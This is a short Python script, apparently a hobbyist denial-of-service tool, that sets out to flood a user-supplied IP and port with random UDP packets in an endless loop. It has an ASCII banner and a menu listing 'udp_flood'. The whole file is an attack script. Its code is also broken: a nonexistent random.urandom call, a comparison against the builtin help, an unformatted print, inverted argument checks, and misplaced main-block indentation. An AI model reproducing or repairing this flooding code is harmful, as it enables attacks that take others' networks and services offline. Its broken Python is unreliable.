import socket
import random
import sys
import time

print("+==================================================================+")
print("|    ███████              █████      ███   █████              ████ |")
print("|  ███░░░░░███           ░░███      ░░░   ░░███              ░░███ |")
print("| ███     ░░███ ████████  ░███████  ████  ███████    ██████   ░███ |")
print("|░███      ░███░░███░░███ ░███░░███░░███ ░░░███░    ░░░░░███  ░███ |")
print("|░███      ░███░░███░░███ ░███░░███░░███ ░░░███░    ░░░░░███  ░███ |")
print("|░░███     ███  ░███      ░███ ░███ ░███   ░███ ███ ███░░███  ░███ |")
print("| ░░░███████░   █████     ████████  █████  ░░█████ ░░████████ █████|")
print("|   ░░░░░░░    ░░░░░     ░░░░░░░░  ░░░░░    ░░░░░   ░░░░░░░░ ░░░░░ |")
print("+==================================================================+")

def main_ui(ui,):
 print("Type help for commands:")
cmd = input("--> ")
if cmd == help:
 print("commands ->> udp_flood")
cmd = input("--> ")


def udp_flood(target_ip, ipport):
 target_ip = input("put in ip -->")
 ipport = input("now put in ip port --> ")
 client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 packet = random.urandom(5024)
 client.sendto(packet, (target_ip, ipport))
 print("Targeting {target_ip}:{ipport} with UDP packet")

 if __name__=="__main__":
  if len(sys.argv) !=3:
   print(" text <ip> <port>")

   target_ip = sys.argv[1]
   ipport = int(sys.argv[2])
   
   while True:
    udp_flood(target_ip, ipport)
     
 
  